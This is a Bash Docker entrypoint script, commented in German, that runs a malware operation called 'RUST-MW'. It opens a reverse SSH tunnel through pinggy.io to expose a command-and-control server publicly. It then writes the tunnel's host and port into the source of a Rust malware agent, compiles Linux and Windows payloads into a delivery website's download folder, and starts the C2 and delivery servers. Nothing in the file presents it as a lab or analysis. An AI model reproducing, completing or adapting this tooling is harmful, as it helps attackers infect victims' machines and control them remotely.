#!/bin/bash

# ==========================================
#  Docker Entrypoint Script
#  Orchestriert alle Dienste im Container
# ==========================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MAIN_RS="/app/malware_agent/src/main.rs"
PINGGY_OUTPUT="/tmp/pinggy_output"

print_status() { echo -e "${BLUE}[*] $1${NC}"; }
print_success() { echo -e "${GREEN}[+] $1${NC}"; }
print_error() { echo -e "${RED}[!] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }

# ==========================================
#  Cleanup Handler
# ==========================================
cleanup() {
    print_status "Beende alle Dienste..."
    kill $(jobs -p) 2>/dev/null || true
    exit 0
}

trap cleanup SIGINT SIGTERM

# ==========================================
#  Pinggy Tunnel starten und URL parsen
# ==========================================
start_pinggy_and_get_url() {
    print_status "Starte Pinggy Tunnel..."
    
    # Pinggy im Hintergrund mit Ausgabe in Datei
    # -F /dev/null ignoriert jegliche SSH-Config
    ssh -F /dev/null \
        -o StrictHostKeyChecking=no \
        -o ServerAliveInterval=60 \
        -o UserKnownHostsFile=/dev/null \
        -p 443 \
        -R0:localhost:4444 \
        tcp@a.pinggy.io 2>&1 | tee "$PINGGY_OUTPUT" &
    
    PINGGY_PID=$!
    
    print_status "Warte auf Pinggy URL..."
    
    local timeout=45
    local elapsed=0
    
    while [ $elapsed -lt $timeout ]; do
        if [ -f "$PINGGY_OUTPUT" ]; then
            PINGGY_URL=$(grep -oE 'tcp://[a-zA-Z0-9.-]+:[0-9]+' "$PINGGY_OUTPUT" 2>/dev/null | head -1)
            
            if [ -n "$PINGGY_URL" ]; then
                PINGGY_HOST=$(echo "$PINGGY_URL" | sed 's|tcp://||' | cut -d':' -f1)
                PINGGY_PORT=$(echo "$PINGGY_URL" | sed 's|tcp://||' | cut -d':' -f2)
                
                print_success "Pinggy URL gefunden: $PINGGY_URL"
                return 0
            fi
        fi
        sleep 1
        ((elapsed++))
    done
    
    print_error "Timeout beim Warten auf Pinggy URL!"
    return 1
}

# ==========================================
#  Rust Code konfigurieren
# ==========================================
configure_rust_code() {
    print_status "Konfiguriere C2-Adresse im Rust Code..."
    
    # Ersetze die Konstanten
    sed -i "s|const C2_IP: &str = \"[^\"]*\";|const C2_IP: \&str = \"$PINGGY_HOST\";|" "$MAIN_RS"
    sed -i "s|const C2_PORT: u16 = [0-9]*;|const C2_PORT: u16 = $PINGGY_PORT;|" "$MAIN_RS"
    
    print_success "C2-Konfiguration: $PINGGY_HOST:$PINGGY_PORT"
}

# ==========================================
#  Payloads kompilieren
# ==========================================
build_payloads() {
    print_status "Kompiliere Payloads..."
    
    cd /app/malware_agent
    
    # Linux
    print_status "  → Linux Build..."
    cargo build --release
    cp target/release/rust-mw /app/delivery/DbD-Site/files/payload_linux 2>/dev/null || true
    
    # Windows
    print_status "  → Windows Build..."
    cargo build --release --target x86_64-pc-windows-gnu || print_warning "Windows Build fehlgeschlagen"
    cp target/x86_64-pc-windows-gnu/release/rust-mw.exe /app/delivery/DbD-Site/files/payload_win.exe 2>/dev/null || true
    
    # Dummy Mac
    echo "Dummy Mac Payload (Cross-Compile nicht verfügbar)" > /app/delivery/DbD-Site/files/payload_mac
    
    print_success "Payloads kompiliert!"
    ls -la /app/delivery/DbD-Site/files/
    
    cd /app
}

# ==========================================
#  Dienste starten
# ==========================================
start_services() {
    # C2 Server
    print_status "Starte C2 Server auf Port 4444..."
    cd /app/c2_server
    python3 server.py &
    C2_PID=$!
    
    sleep 2
    
    # Delivery Server
    print_status "Starte Delivery Server auf Port 8080..."
    cd /app/delivery/DbD-Site
    python3 server.py &
    DELIVERY_PID=$!
    
    cd /app
    
    print_success "Alle Dienste gestartet!"
}

# ==========================================
#  Status anzeigen
# ==========================================
show_status() {
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}  RUST-MW SYSTEM AKTIV${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}Pinggy Tunnel:${NC}   $PINGGY_URL"
    echo -e "  ${GREEN}C2 Server:${NC}       localhost:4444 (via Pinggy erreichbar)"
    echo -e "  ${GREEN}Delivery:${NC}        localhost:8080"
    echo ""
    echo -e "  ${YELLOW}Payloads verbinden sich zu:${NC}"
    echo -e "    Host: $PINGGY_HOST"
    echo -e "    Port: $PINGGY_PORT"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
}

# ==========================================
#  Main
# ==========================================
main() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║           RUST-MW DOCKER CONTAINER                         ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    # Schritt 1: Pinggy starten
    if ! start_pinggy_and_get_url; then
        print_error "Pinggy Tunnel konnte nicht gestartet werden!"
        exit 1
    fi
    
    # Schritt 2: Rust Code konfigurieren
    configure_rust_code
    
    # Schritt 3: Payloads bauen
    build_payloads
    
    # Schritt 4: Dienste starten
    start_services
    
    # Status anzeigen
    show_status
    
    # Am Leben halten
    print_status "Container läuft. Drücke Ctrl+C zum Beenden."
    wait
}

main "$@"
